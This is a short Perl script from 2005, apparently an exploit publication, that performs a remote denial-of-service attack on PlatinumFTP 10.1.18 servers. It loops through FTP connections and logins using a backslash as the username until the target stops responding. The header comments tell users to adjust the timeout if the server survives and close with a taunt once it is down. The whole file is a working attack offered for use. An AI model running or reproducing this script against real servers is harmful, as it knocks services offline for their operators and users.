#!/usr/bin/perl
# plftpdos1.pl - Remote DoS against PlatinumFTP 10.1.18 using \
# 
# If you don't get the server down try to change/play a little bit with
# the Timeout

# 2005/05/03
#
# ports at securityforest dot com | greetings to muts, barabas, s|33py,
# revised and all guys at www.whitehat.co.il


use strict;
use Net::FTP;

my $host;
my $username = '\\';

if ($#ARGV < 0) { &syntax(); }
$host = @ARGV[0]; 

my $ftp = Net::FTP->new($host, Timeout => 2, Debug => 0, Port => 21) or die "can you see a ftp server? i can't.\n";

print "denial of service in progress\n";

while (my $ftp = Net::FTP->new($host, Timeout => 2, Debug => 0, Port => 21))
{
    my $ftp = Net::FTP->new($host, Timeout => 0.1, Debug => 0, Port => 21);
    $ftp->login($username);
}

print "server is down. now run forest, RUN!\n";

sub syntax {
    print "\nUsage: pftpdos1.pl IP\n";
    exit (1);
    }
